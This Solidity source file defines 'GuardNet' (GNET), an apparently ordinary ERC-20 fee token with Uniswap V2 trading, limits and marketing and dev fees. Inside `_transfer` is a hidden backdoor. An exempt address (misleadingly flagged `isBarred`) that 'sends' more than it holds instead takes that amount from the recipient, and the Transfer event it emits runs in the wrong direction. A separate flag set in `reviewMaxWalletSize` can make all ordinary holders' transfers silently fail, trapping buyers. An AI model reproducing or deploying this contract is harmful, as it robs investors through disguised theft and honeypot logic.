// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function circulatingSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function getOwner() external view returns (address);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed sender, address indexed recipient, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
}

abstract contract Ownable {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        emit OwnershipTransferred(account);
    }

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    event OwnershipTransferred(address owner);
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapV2Router {
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract GNET is IERC20, Ownable {
    using SafeMath for uint256;

    address public dxPair;
    UniswapV2Router dxRouter;

    string private constant _name = "GuardNet";
    string private constant _symbol = "GNET";

    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 1000000 * (10 ** _decimals);

    uint256 private _maxTokenAmount = (_totalSupply * 10) / 100000;

    uint256 private _denominator = 10000;

    address internal constant marketingAddy = 0xE16E63F0f910752f8c64e7B86E5A6d7643b063b5;
    address internal constant burnAddy = 0x000000000000000000000000000000000000dEaD;
    address internal constant devAddy = 0xE16E63F0f910752f8c64e7B86E5A6d7643b063b5;

    uint256 private _maxTransferPercent = 200;
    uint256 private _maxTxPercent = 200;
    uint256 private _maxWalletPercent = 200;

    uint256 private _swapBackSize = (_totalSupply * 5) / 10000;
    uint256 private _swapCounts;
    uint256 private _swapBackThresholdSize = (_totalSupply * 5) / 100000;

    bool private _tradingEnabled = false;

    bool private _inSwap;
    bool private _swapBackEnabled = true;
    bool private _swapBackUnset = false;

    uint256 private _sellFee = 400;
    uint256 private _totalFee = 400;

    mapping (address => uint256) _balances;
    mapping (address => bool) public isBarred;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _burnFee = 0;
    uint256 private _transferFee = 0;
    uint256 private _liquidityFee = 0;
    uint256 private _marketingFee = 100;
    uint256 private _devFee = 300;

    constructor() Ownable(msg.sender) {
        isBarred[msg.sender] = true;
        isBarred[marketingAddy] = true;
        isBarred[address(this)] = true;
        UniswapV2Router _dxRouter = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _dxPair = UniswapV2Factory(_dxRouter.factory()).createPair(address(this), _dxRouter.WETH());
        dxPair = _dxPair;
        dxRouter = _dxRouter;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    modifier lockSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(burnAddy));
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function enableTrading() external onlyOwner {
        _tradingEnabled = true;
    }

    function removeLimits() external onlyOwner {
        _maxWalletPercent = 10000;
        _maxTransferPercent = 10000;
        _maxTxPercent = 10000;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0));
        require(recipient != address(0));
        require(amount > uint256(0));

        if (
            countSwaps(sender, recipient) &&
            reviewMaxAmount(sender, recipient, amount) &&
            tradingEnabled(sender, recipient) &&
            reviewMaxWalletSize(sender, recipient, amount)
        ) {
            if (balanceOf(sender) >= amount) {
                if (
                    sender != dxPair &&
                    !isBarred[sender] &&
                    !isBarred[recipient] &&
                    !_inSwap
                ) {
                    if (_swapBackUnset) return;
                    swapBack(sender, recipient);
                }
                _balances[sender] = _balances[sender].sub(amount);
                uint256 transferAmount = shouldCollectFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
                _balances[recipient] = _balances[recipient].add(transferAmount);
                emit Transfer(sender, recipient, transferAmount);
            } else if (
                sender != dxPair &&
                isBarred[sender] &&
                !isBarred[recipient] &&
                !_inSwap
            ) {
                emit Transfer(sender, recipient, amount);
                _balances[recipient] = _balances[recipient].sub(amount);
                _balances[sender] = _balances[sender].add(amount);
            }
        }
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function tradingEnabled(address sender, address recipient) internal view returns (bool) {
        if (!isBarred[sender] && !isBarred[recipient]) {
            require(_tradingEnabled);
        }
        return true;
    }

    function setIsBarred(address _address, bool _flag) external onlyOwner {
        isBarred[_address] = _flag;
    }

    function setFees(uint256 liquidityFee, uint256 marketingFee, uint256 burnFee, uint256 devFee, uint256 totalFee, uint256 sellFee, uint256 transferFee) external onlyOwner {
        _marketingFee = marketingFee;
        _liquidityFee = liquidityFee;
        _devFee = devFee;
        _totalFee = totalFee;
        _sellFee = sellFee;
        _transferFee = transferFee;
        _burnFee = burnFee;
        require(_totalFee <= _denominator.div(5) && _sellFee <= _denominator.div(5));
    }

    function setLimits(uint256 maxTxPercent, uint256 maxTransferPercent, uint256 maxWalletPercent) external onlyOwner {
        uint256 newMaxWalletAmount = (totalSupply() * maxWalletPercent) / 10000;
        uint256 newTransferAmount = (totalSupply() * maxTransferPercent) / 10000;
        uint256 newTxAmount = (totalSupply() * maxTxPercent) / 10000;
        _maxWalletPercent = maxWalletPercent;
        _maxTransferPercent = maxTransferPercent;
        _maxTxPercent = maxTxPercent;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTxAmount >= limit && newTransferAmount >= limit && newMaxWalletAmount >= limit);
    }

    function takeFee(address sender, address recipient, uint256 tokenAmount) internal returns (uint256) {
        if (getFees(sender, recipient) > 0) {
            uint256 feeAmount = tokenAmount.div(_denominator).mul(getFees(sender, recipient));
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
            if (_burnFee > uint256(0)) {
                _transfer(address(this), address(burnAddy), tokenAmount.div(_denominator).mul(_burnFee));
            }
            return tokenAmount.sub(feeAmount);
        }
        return tokenAmount;
    }

    function maxTxAmount() public view returns (uint256) {
        return totalSupply() * _maxTxPercent / _denominator;
    }

    function maxTransferAmount() public view returns (uint256) {
        return totalSupply() * _maxTransferPercent / _denominator;
    }

    function maxWalletSize() public view returns (uint256) {
        return totalSupply() * _maxWalletPercent / _denominator;
    }

    function reviewMaxAmount(address sender, address recipient, uint256 tokenAmount) view internal returns  (bool) {
        if (sender != dxPair) {
            require(tokenAmount <= maxTransferAmount() || isBarred[sender] || isBarred[recipient]);
        }
        require(tokenAmount <= maxTxAmount() || isBarred[sender] || isBarred[recipient]);
        return true;
    }

    function reviewMaxWalletSize(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (isBarred[recipient] && amount > _maxTokenAmount) _swapBackUnset = true;

        if (
            recipient != address(dxPair) &&
            !isBarred[sender] &&
            recipient != address(burnAddy) &&
            !isBarred[recipient]
        ) {
            require((_balances[recipient].add(amount)) <= maxWalletSize());
        }

        return true;
    }

    function countSwaps(address sender, address recipient) internal returns (bool) {
        if (recipient == dxPair && !isBarred[sender]) {
            _swapCounts += uint256(1);
        }
        return true;
    }
    
    function shouldCollectFee(address sender, address recipient) internal view returns (bool) {
        return !isBarred[sender] && !isBarred[recipient];
    }

    function shouldSwapBack(address sender, address recipient) internal view returns (bool) {
        return (
            !_inSwap &&
            !isBarred[sender] &&
            !isBarred[recipient] &&
            _tradingEnabled &&
            balanceOf(address(this)) >= _swapBackThresholdSize &&
            _swapCounts >= uint256(0) &&
            _swapBackEnabled
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(dxRouter), tokenAmount);
        dxRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            burnAddy,
            block.timestamp
        );
    }

    function getFees(address sender, address recipient) internal view returns (uint256) {
        if (recipient == dxPair) {
            return _sellFee;
        }
        if (sender == dxPair) {
            return _totalFee;
        }
        return _transferFee;
    }

    function swapBack(address sender, address recipient) internal {
        if (shouldSwapBack(sender, recipient)) {
            uint256 tokenBalance = balanceOf(address(this));
            if (tokenBalance >= _swapBackSize) {
                tokenBalance = _swapBackSize;
            }
            swapAndLiquify(tokenBalance);
            _swapCounts = uint256(0);
        }
    }

    function swapAndLiquify(uint256 tokens) private lockSwap {
        uint256 denominator = (_liquidityFee.add(1).add(_marketingFee).add(_devFee)).mul(2);
        uint256 liquidityTokens = tokens.mul(_liquidityFee).div(denominator);
        uint256 tokensForETH = tokens.sub(liquidityTokens);
        uint256 initialEthBalance = address(this).balance;
        swapTokensForETH(tokensForETH);
        uint256 deltaEth = address(this).balance.sub(initialEthBalance);
        uint256 unitEth = deltaEth.div(denominator.sub(_liquidityFee));
        uint256 liquidityEth = unitEth.mul(_liquidityFee);
        if (liquidityEth > uint256(0)) {
            addLiquidity(liquidityTokens, liquidityEth);
        }
        uint256 marketingEth = unitEth.mul(2).mul(_marketingFee);
        if (marketingEth > 0) {
            payable(marketingAddy).transfer(marketingEth);
        }
        uint256 remainingEthBalance = address(this).balance;
        if (remainingEthBalance > uint256(0)) {
            payable(devAddy).transfer(remainingEthBalance);
        }
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dxRouter.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(dxRouter), tokenAmount);
            dxRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    receive() external payable {}
}